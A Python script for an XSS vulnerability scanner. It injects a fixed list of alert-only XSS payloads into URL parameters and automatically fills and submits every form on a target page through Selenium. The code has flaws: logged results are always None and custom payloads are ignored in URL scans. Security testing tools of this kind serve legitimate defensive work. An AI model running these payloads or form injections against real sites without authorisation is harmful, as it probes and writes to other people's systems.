import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException, StaleElementReferenceException
import time
import logging
import argparse
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

# Payloads function
def get_xss_payloads():
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "';alert('XSS');//",
        "<svg/onload=alert('XSS')>",
        "\";alert('XSS');//",
        "<iframe src=javascript:alert('XSS')>",
    ]

# HTTP Request handler
def get_request(url):
    try:
        response = requests.get(url)
        return response
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error fetching URL {url}: {e}")
        return None

# Inject payload into URL
def inject_payload(url, payload):
    if "?" in url:
        return url + "&payload=" + payload
    else:
        return url + "?payload=" + payload

# Analyze response
def analyze_response(response, payload):
    if payload in response.text:
        if "<script>" in response.text or "alert(" in response.text:
            print(Fore.GREEN + f"XSS vulnerability found! Payload executed: {payload}")
        else:
            print(Fore.YELLOW + f"Payload reflected but not executed: {payload}")
    else:
        print(Fore.RED + f"No XSS found with payload: {payload}")

# Logging setup
logging.basicConfig(filename='xss_scan_results.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def log_scan_result(url, payload, result):
    message = f"Scanned URL: {url} | Payload: {payload} | Result: {result}"
    logging.info(message)
    print(message)

# DOM-based XSS scanning
def scan_dom_xss(url, payload):
    print(Fore.CYAN + f"Scanning {url} for DOM-based XSS vulnerabilities with payload: {payload}...")

    # Configure Selenium WebDriver (ChromeDriver)
    service = Service('C:\\Users\\Atharva\\chromedriver-win64\\chromedriver.exe')
    driver = webdriver.Chrome(service=service)
    driver.get(url)
    
    try:
        # Inject payload into URL and load the page
        injected_url = inject_payload(url, payload)
        driver.get(injected_url)

        # Check if payload is present in DOM
        if payload in driver.page_source:
            print(Fore.GREEN + f"DOM-based XSS vulnerability found with payload: {payload}")
        else:
            print(Fore.RED + f"No DOM-based XSS found with payload: {payload}")
    except Exception as e:
        print(Fore.RED + f"Error scanning DOM: {e}")
    finally:
        driver.quit()

# Form-based XSS scanning
def scan_forms_for_xss(url, payload):
    service = Service('C:\\Users\\Atharva\\chromedriver-win64\\chromedriver.exe')  # Update this with the correct path to ChromeDriver
    driver = webdriver.Chrome(service=service)
    driver.get(url)
    
    try:
        # Find all forms on the page
        forms = driver.find_elements(By.TAG_NAME, 'form')
        
        if forms:
            for form in forms:
                # Attempt to interact with the form
                try:
                    input_elements = form.find_elements(By.TAG_NAME, 'input')
                    for input_element in input_elements:
                        # Clear the input field first
                        input_element.clear()
                        # Try to input the XSS payload into the input field
                        input_element.send_keys(payload)
                        time.sleep(1)
                    
                    # Submit the form
                    form.submit()
                    time.sleep(2)

                    # Handle alerts if present
                    try:
                        alert = Alert(driver)
                        alert_text = alert.text
                        alert.accept()  # Dismiss the alert
                        print(Fore.YELLOW + f"Alert found and dismissed: {alert_text}")
                    except NoAlertPresentException:
                        pass

                    # Check the URL or the response for reflected XSS payloads
                    if payload in driver.page_source:
                        result = f"Potential XSS in form on {url} with payload {payload}"
                        print(Fore.GREEN + result)
                        log_scan_result(url, payload, result)
                    else:
                        result = f"No XSS detected in form on {url} with payload {payload}"
                        print(Fore.RED + result)
                        log_scan_result(url, payload, result)
                except StaleElementReferenceException:
                    print(Fore.RED + "Stale element reference detected, re-fetching the form elements...")
                    forms = driver.find_elements(By.TAG_NAME, 'form')  # Refetch the forms
    except UnexpectedAlertPresentException as e:
        print(Fore.RED + f"Unexpected alert detected: {e}")
    finally:
        driver.quit()

# URL-based XSS scanning
def scan_url(url):
    print(Fore.CYAN + f"Scanning {url} for XSS vulnerabilities...")

    # Basic GET request
    response = get_request(url)
    
    if response:
        # Loop through payloads and inject them into the URL
        payloads = get_xss_payloads()
        for payload in payloads:
            print(Fore.MAGENTA + f"\nTesting payload: {payload}")
            injected_url = inject_payload(url, payload)
            print(Fore.BLUE + f"Injected URL: {injected_url}")
            
            # Server-side XSS detection
            response = get_request(injected_url)
            if response:
                result = analyze_response(response, payload)
                log_scan_result(url, payload, result)

            # DOM-based XSS detection
            scan_dom_xss(url, payload)
    else:
        print(Fore.RED + "Failed to fetch the URL.")

# Argument parsing
def parse_arguments():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument('--url', type=str, required=True, help="URL to scan for XSS vulnerabilities")
    parser.add_argument('--payloads', type=str, nargs='+', help="Custom XSS payloads")
    return parser.parse_args()

# Main script execution
if __name__ == "__main__":
    args = parse_arguments()

    if args.payloads:
        payloads = args.payloads
    else:
        payloads = get_xss_payloads()

    # Scan the URL for XSS vulnerabilities
    scan_url(args.url)
    for payload in payloads:
        scan_forms_for_xss(args.url, payload)
